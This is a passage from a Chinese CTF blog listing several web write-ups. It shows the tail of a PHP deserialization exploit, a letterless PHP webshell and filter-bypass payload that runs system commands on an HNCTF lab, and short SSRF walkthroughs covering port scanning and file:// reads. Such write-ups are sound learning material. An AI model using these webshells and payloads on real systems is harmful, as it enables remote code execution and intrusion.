class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$ee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$ee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="comment">//$easy-&gt;cla=$copy_ee;</span></span><br><span class="line"><span class="comment">//$sec-&gt;var[0]=$ee;修改为var，去掉数组[]。为什么这样修改，我暂时还不太清楚，以后了解了，会回来更新的</span></span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>=<span class="variable">$ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>)));</span><br></pre></td></tr></table></figure>

<p>其中，为什么<code>$easy-&gt;cla=$copy_ee;</code>删除掉，我的理解是要想让eeee类中__clone()函数触发，只需要eeee类被克隆就OK了，就是让Easy类中的$var&#x3D;$eeee类，而不用再定义Easy中的cla属性。</p>
<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/3.png"></p>
<p>最后，编写的exp可以运行，传入后得到flag</p>
<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/4.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/19/NSWSTAR-week2-UnserializeOne/" data-id="cl9hxo4hk000z20v4ddtv4uux" data-title="NSWSTAR-week2-UnserializeOne" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NSSCTF-HNCTF-Week1-Challenge-rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/" class="article-date">
  <time class="dt-published" datetime="2022-10-16T14:42:58.000Z" itemprop="datePublished">2022-10-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/">NSSCTF-HNCTF-[Week1]Challenge__rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>废话不多说，直接分析题目。</p>
<p>进入题目，发现一个提示，</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/0.png"></p>
<p>既然灵感是来自ctfshou吃瓜杯，那么吃瓜杯的解题思路也应该适用本题，先进入靶机看下题目，发现一片空白，</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/1.png"></p>
<p>自然先按F12看源码里有没有提示信息，发现?hint，</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/2.png"></p>
<p>试着用GET传一个hint&#x3D;1参数，提交后出现源码，是一个RCE，</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/4.png"></p>
<p>分析下就是用POST传一个rce参数，但是长度不能超过120，而且又过滤了全部字母，以及大多数符号，看下最后能用的字符只有</p>
<p>0-9，$、_、[]、{}这些字符。只用无字符咋能RCE啊？没什么思路，看下题目那里的提示，CTFshow吃瓜杯，百度搜下writeup，</p>
<p>发现了一篇p神写的无数字字符的webshell的博客，<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p>总结下文章主要内容，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>， 如何编写一个不使用数字和字母的webshell？</span><br><span class="line">    </span><br><span class="line">首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的</span><br><span class="line">特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</span><br><span class="line">有三个方法，异或，取反，自增，本题使用的是第三个方法，前两个方法为什么用不了，文章里有说明。</span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>， 方法三的主要原理是，</span><br><span class="line">    </span><br><span class="line">在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <span class="variable">$a</span> = <span class="string">&#x27;Z&#x27;</span>; <span class="variable">$a</span>++; 将把 <span class="variable">$a</span> 变成<span class="string">&#x27;AA&#x27;</span>，而在 C </span><br><span class="line">中，a = <span class="string">&#x27;Z&#x27;</span>; a++; 将把 a 变成 <span class="string">&#x27;[&#x27;</span>（<span class="string">&#x27;Z&#x27;</span> 的 ASCII 值是 <span class="number">90</span>，<span class="string">&#x27;[&#x27;</span> 的 ASCII 值是 <span class="number">91</span>）。注意字符变量只能递</span><br><span class="line">增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。</span><br><span class="line">也就是说，<span class="string">&#x27;a&#x27;</span>++ =&gt; <span class="string">&#x27;b&#x27;</span>，<span class="string">&#x27;b&#x27;</span>++ =&gt; <span class="string">&#x27;c&#x27;</span>... 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</span><br><span class="line">那么，如何拿到一个值为字符串<span class="string">&#x27;a&#x27;</span>的变量呢？</span><br><span class="line">巧了，数组（Array）的第一个字母就是大写A，而且第<span class="number">4</span>个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-</span><br><span class="line">Z的所有字母。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</span><br><span class="line">再取这个字符串的第一个字母，就可以获得<span class="string">&#x27;A&#x27;</span>了。然后利用递增，可以获取A-Z所有字符</span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>,  利用这个技巧，我编写了如下命令为<span class="title function_ invoke__">ASSERT</span>(<span class="variable">$_POST</span>[]);的webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是，无需获取小写a）</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>这个思路对本题来说是正确的，但写本题的webshell还需一些更改，比如博客里获取Array是通过@.”[]”得到的，但是本题的@是被过滤了，$没有被过滤，所以使用以下代码获取字符A </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_=$;$_=$_.[];//此时的$_为Array</span><br><span class="line">$__=$_[0]//$__为A </span><br><span class="line"></span><br><span class="line">由于参数rce有长度限制，所以要尽可能的简化代码，</span><br><span class="line"></span><br><span class="line">上面的代码可以简化为</span><br><span class="line">$_.=[];//不用定义$_=$，直接只用.拼接[],此时$_为Array</span><br><span class="line">$_=$_[0];//$_为A</span><br></pre></td></tr></table></figure>

<p>这里还需要了解PHP 前自增加和后自增加的区别，百度结果如下，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">前自增加：</span><br><span class="line"></span><br><span class="line">$b = 1;</span><br><span class="line">$a = ++$b;       //此语句等同于： $b=$b+1; $a=$b；</span><br><span class="line">echo &#x27;$a=&#x27;.$a;</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;$b=&#x27;.$b;</span><br><span class="line">解释：前递增++$b,把$b的值增加了1后再返回给$b和$a</span><br><span class="line">结果：</span><br><span class="line">$a=2</span><br><span class="line">$b=2</span><br><span class="line"> </span><br><span class="line">后自增加：</span><br><span class="line">$b = 1;</span><br><span class="line">$a = $b++;      // 此语句等同于： $a=$b; $b=$b+1；</span><br><span class="line">echo &#x27;$a=&#x27;.$a;</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;$b=&#x27;.$b;</span><br><span class="line">结果：</span><br><span class="line">$a=1</span><br><span class="line">$b=2</span><br></pre></td></tr></table></figure>

<p>第一次写的payload为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>.=[];<span class="comment">//$_为Array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">1</span>];<span class="comment">//$__为r</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">3</span>];<span class="comment">//$_为a</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_0</span>=<span class="variable">$_</span>++;<span class="comment">//$_0为c，$_为d</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//$_为g</span></span><br><span class="line"><span class="variable">$_1</span>=++<span class="variable">$_</span>;<span class="comment">//$_、$_1为h</span></span><br><span class="line"><span class="variable">$_3</span>=<span class="variable">$_0</span>.<span class="variable">$_1</span>.<span class="variable">$__</span>[<span class="number">1</span>];<span class="comment">//$_3为chr</span></span><br><span class="line"><span class="variable">$_4</span>=_.<span class="variable">$_3</span>(<span class="number">71</span>).<span class="variable">$_3</span>(<span class="number">69</span>).<span class="variable">$_3</span>(<span class="number">84</span>);<span class="comment">//利用php的chr函数得到_GET字符</span></span><br><span class="line">(<span class="variable">$$_4</span>[<span class="number">1</span>])(<span class="variable">$$_4</span>[<span class="number">2</span>]);<span class="comment">//拼接得到($_GET[1])($_GET[2])</span></span><br></pre></td></tr></table></figure>

<p>但是URL编码后提交，会显示too long!</p>
<p>那么还需要简化下payload。</p>
<p>观察下，发现可以利用把</p>
<p><code>$_1=++$_;//$_、$_1为h $_3=$_0.$_1.$__[1];//$_3为chr</code></p>
<p>合并起来，并且开始的    <code>$__=$_[1];//$__为r</code>   可以删除，然后与上面的合并。</p>
<p>总的来说就是利用<strong>后自增加</strong> 然后将$_变为h时，然后直接拼接成chr字符。</p>
<p>合并后代码，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>.=[];<span class="comment">//$__不用定义为$，最后为$__为Array，</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>[<span class="number">3</span>];<span class="comment">//$_为a</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_0</span>=<span class="variable">$_</span>++;<span class="comment">//$_开始为c，然后先赋值给$_0，然后再自增为d</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//这时的$_为g</span></span><br><span class="line"><span class="variable">$_0</span>.=++<span class="variable">$_</span>.<span class="variable">$__</span>[<span class="number">1</span>];<span class="comment">//$_开始为g，然后自增为h，$__[]为开始的Array，没有变,那么$__[1]为r。$_0为c，拼接后$_0为chr</span></span><br><span class="line"><span class="variable">$_4</span>=_.<span class="variable">$_0</span>(<span class="number">71</span>).<span class="variable">$_0</span>(<span class="number">69</span>).<span class="variable">$_0</span>(<span class="number">84</span>);<span class="comment">//$_4为_GET</span></span><br><span class="line">(<span class="variable">$$_4</span>[<span class="number">1</span>])(<span class="variable">$$_4</span>[<span class="number">2</span>]);<span class="comment">//($_GET[1])($_GET[2])</span></span><br></pre></td></tr></table></figure>

<p>用GET提交?hint&#x3D;1&amp;1&#x3D;system&amp;2&#x3D;ls，payload通过POST然后经URL编码，提交发现ls命令执行成功</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/5.png"></p>
<p>接下来依次执行ls &#x2F;</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/6.png"></p>
<p>最后直接cat &#x2F;ffflllaaaggg，找到flag</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/7.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/" data-id="cl9hxo4hj000x20v4acu660ff" data-title="NSSCTF-HNCTF-[Week1]Challenge__rce" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTFHUB-SSRF-端口扫描" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" class="article-date">
  <time class="dt-published" datetime="2022-10-15T03:55:22.000Z" itemprop="datePublished">2022-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/">CTFHUB-SSRF-端口扫描</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>题目有个提示，</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/1.png"></p>
<p>那就批量访问8000-9000端口呗，进入靶机，啥都没有，只有URL里有个待写参数，</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/2.png"></p>
<p>那就抓包图示包然后批量访问本机端口，</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/3.png"></p>
<p>给端口加上变量，然后设置范围为8000-9000，</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/4.png"></p>
<p>最后按长度排序，发现8791端口长度与其他的不同，打开发现flag，</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/0.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" data-id="cl9hxo4gx000420v4foe8bks1" data-title="CTFHUB-SSRF-端口扫描" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTFHUB-SSRF-伪协议读取文件" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/" class="article-date">
  <time class="dt-published" datetime="2022-10-15T02:22:31.000Z" itemprop="datePublished">2022-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/">CTFHUB-SSRF-伪协议读取文件</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>前置知识：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php伪协议：https://blog.csdn.net/cosmoslin/article/details/120695429</span><br></pre></td></tr></table></figure>

<p>打开题目页面，有个提示，</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/4.png"></p>
<p>网站服务器系统一般都是linux，那么linux网页web默认目录在哪呢？直接百度下，</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/03.png"></p>
<p>那么只需要读取该目录下的flag.php应该就行了，伪协议有很多，但是有的不能使用，所以需要测试哪些是可用的，先测试php:&#x2F;&#x2F;filter协议，不可用。</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/02.png"></p>
<p>测试file协议，发现可用。</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/2.png"></p>
<p>把路径换为&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php，</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/7.png"></p>
<p>发现访问成功了，但是没显示flag，猜想是不是在注释里面，看下源码，找到flag</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/0.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/" data-id="cl9hxo4h8000920v491mjggmk" data-title="CTFHUB-SSRF-伪协议读取文件" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTFHUB-SSRF-内网访问" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/" class="article-date">
  <time class="dt-published" datetime="2022-10-15T02:14:30.000Z" itemprop="datePublished">2022-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/">CTFHUB-SSRF-内网访问</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>题目有个提示，</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/0.png"></p>
<p>那应该就是传入一个 127.0.0.1&#x2F;flag.php的URL，</p>
<p>进入靶机后，发现什么都没有，只在URL里发现一个传参的地方，</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/1.png"></p>
<p>那就试着传 ?url&#x3D;127.0.0.1&#x2F;flag.php，直接发现flag</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/2.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/" data-id="cl9hxo4gu000220v4a1ii59pg" data-title="CTFHUB-SSRF-内网访问" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTFHUB-RCE-文件包含" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
  <time class="dt-published" datetime="2022-10-15T01:44:50.000Z" itemprop="datePublished">2022-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">CTFHUB-RCE-文件包含</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>进入靶机，发现几行代码，</p>
<p><img src="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/0.png"></p>
<p>有文件包含代码，有一个字符flag过滤，根据下面的shell提示，点进去，</p>
<p><img src="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png"></p>
